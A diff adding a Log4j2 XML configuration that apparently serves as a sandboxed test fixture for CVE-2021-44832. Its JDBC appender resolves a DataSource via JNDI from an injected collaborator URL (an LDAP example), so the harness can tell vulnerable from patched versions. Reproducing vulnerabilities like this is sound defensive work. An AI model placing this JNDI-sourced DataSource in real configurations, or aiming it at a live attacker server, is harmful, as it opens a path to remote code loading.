@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Case C — ATTACKER-CONTROLLED logging config (the recorded precondition
+  `attacker_controlled_logging_config`). Used by both checkpoints so the two
+  traces compare like-for-like; only the log4j-core version differs.
+
+  The JDBC Appender's ConnectionSource is a DataSource resolved via JNDI. The
+  jndiName points at the controlled collaborator. On 2.17.0 log4j resolves the
+  attacker DataSource -> outbound connection attempt to the collaborator. On
+  2.17.1 the DataSource is restricted to the java: protocol and JNDI is forbidden
+  for it, so the resolution is refused and no outbound attempt fires.
+
+  EFFECT-ONLY: the collaborator only records the connection attempt. No payload
+  is served and no code is executed. ${env:COLLABORATOR_JNDI} is injected by the
+  sandbox (e.g. ldap://collaborator:1389/datasource); it is the observability
+  sink, not a weaponization vector.
+-->
+<Configuration status="WARN">
+  <Appenders>
+    <Console name="Console" target="SYSTEM_OUT">
+      <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
+    </Console>
+    <JDBC name="AttackerJdbc" tableName="logs">
+      <!-- Attacker-controlled: DataSource resolved from a JNDI name that points
+           at the collaborator. This is the sink the CVE-2021-44832 fix closes. -->
+      <DataSource jndiName="${env:COLLABORATOR_JNDI}"/>
+      <Column name="message" pattern="%message"/>
+    </JDBC>
+  </Appenders>
+  <Loggers>
+    <Root level="error">
+      <AppenderRef ref="Console"/>
+      <AppenderRef ref="AttackerJdbc"/>
+    </Root>
+  </Loggers>
+</Configuration>
